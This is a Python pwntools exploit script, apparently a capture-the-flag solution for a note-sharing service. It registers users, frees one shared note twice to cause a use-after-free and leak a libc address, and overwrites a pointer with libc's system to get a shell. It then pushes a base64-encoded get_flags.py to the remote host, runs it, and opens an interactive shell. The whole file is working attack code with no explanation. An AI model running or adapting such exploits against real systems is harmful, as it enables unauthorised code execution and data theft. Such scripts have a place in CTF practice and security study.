#!/usr/bin/env python3
import sys
from pwn import *

context.terminal = ['tmux','splitw','-h','-p','80']
libc = ELF('./libc.so.6')
# io = process(['./python3', './app.py'])
# gdb.attach(io, 'c\n')

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())
def send(c):
    io.sendlineafter(b': ', c)

def register(n, p):
    cmd(1) ; send(n) ; send(p)

def login(n, p=b''):
    cmd(2) ; send(n)
    if p: send(p)

def logout(c):
    cmd(1) ; send(c)

def add_note(n, i):
    cmd(2) ; send(n) ; send(i)

def add_secret_note(n, k):
    cmd(3) ; send(n) ; send(k)

def delete_note(t):
    cmd(6) ; send(str(t).encode())

def show_shared_note(t):
    cmd(8) ; send(str(t).encode())

def delete_shared_note(t):
    cmd(9) ; send(str(t).encode())

def share_note(n, t):
    cmd(10) ; send(n) ; send(str(t).encode())


OFFSET = 0xa4460

io = remote(sys.argv[1], sys.argv[2])
register(b'user1', b'user1')
register(b'user2', b'user2')
register(b'user3', b'user3')

login(b'user1', b'user1')
logout(b'y')
login(b'user2', b'user2')
logout(b'n')
login(b'user3', b'user3')
add_note(b'bbbbbbbbbbbbbbb', b'b')
add_note(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', b'a')
share_note(b'user1', 1)
delete_note(1)
delete_note(1)
logout(b'y')
login(b'user2', b'user2')
logout(b'y')
login(b'user1')
show_shared_note(0)

io.recvuntil(b'at ')
addr = int(io.recvuntil(b'>')[:-1], 16)
print(hex(addr))
libc.address = addr - OFFSET + 0x2e7000
print('[+] libc: ', hex(libc.address))
# pause()
delete_shared_note(0)
pl = b'-bin/sh\0' + p64(addr+0x10-0x90) + p64(libc.sym.system)
pl = pl.ljust(0x40, b'q')
add_secret_note(b'q'*0x40, xor(b'q'*0x40, pl).hex().encode())
logout(b'y')
cmd(2)
send(b'user2')

s = b64e(open('./get_flags.py', 'rb').read())
io.sendline(f'echo {s} | base64 -d > /tmp/a && python3 /tmp/a && rm /tmp/a')

io.interactive()
